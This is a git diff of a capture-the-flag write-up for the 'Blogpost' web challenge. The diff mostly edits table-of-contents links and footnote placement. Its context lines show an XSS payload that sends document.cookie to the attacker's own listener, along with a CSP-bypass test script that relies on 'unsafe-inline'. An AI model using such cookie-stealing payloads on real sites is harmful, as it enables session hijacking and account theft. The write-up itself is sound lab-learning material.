@@ -7,10 +7,10 @@
 Blogpost is a easy web challenge that one of the challenges that took most of my time in the CTF. Finding the foothold was an interesting process but this challenge has reminded me not to create a tunnel vision when it comes to hacking and ensuring that I check all files to have a good understanding what the challenge is. (I did not realize about the bot.js and basically had troubles stealing the cookie itself)
 
 ## Table of Contents
-1. [Setting up environment]
-2. [Enumeration]
-3. [Foothold]
-4. [Exploitation]
+1. [Setting up environment](https://github.com/notsuspiciousindividual/Stack_The_Flag_CTF_22/tree/main/web_blogpost_1#setting-up-the-environment)
+2. [Enumeration](https://github.com/notsuspiciousindividual/Stack_The_Flag_CTF_22/tree/main/web_blogpost_1#setting-up-the-environment)
+3. [Foothold](https://github.com/notsuspiciousindividual/Stack_The_Flag_CTF_22/tree/main/web_blogpost_1#setting-up-the-environment)
+4. [Exploitation](https://github.com/notsuspiciousindividual/Stack_The_Flag_CTF_22/tree/main/web_blogpost_1#setting-up-the-environment)
 	1.[CSP]
 	2.[Using NGROK]
 
@@ -84,14 +84,14 @@ And it does work! Now with our foothold, what can we do with it?
 ## Exploitation
 During our enumeration, we understand that'll be a bot the crawls through the blog site itself. Hence our objective is to use XSS to steal the "cookie" of the admin which will hold our flag. I made a simple XSS payload that'll force the website to send their user cookie to my server as shown below;
 
-- Payload
+- Payload[^1]
 ```javascript
 <script>
 document.write('<img src="http://127.0.0.1:8000/?'+document.cookie+'"/>');
 </script> 
 //Note that the ip address should be your ip address that you want to take the cookies
 ```
-[^1]
+
 
 - On Our machine (to receive the cookies)
 ```bash
@@ -112,10 +112,10 @@ It is a good mitigation practise but with every mitigation, there'll be ways whe
 
 Hence with the mindset of "hey they probably misconfigured something", we can see that they allowed 'unsafe-inline' which can be our proper foothold for this obstacle. Implementing it in CSP is effectively disabling the important part of CSP. You are allowing javascript to run in the XSS. [^3] Hence with that in mind, let us find a payload to bypass it.
 
-```javascript
+```javascript[^4]
 "/><script>console.log("bypass works");</script>
 ```
-[^4] 
+ 
 
 ![CSP Bypass Works](img/bypasstestWorks.PNG)
 
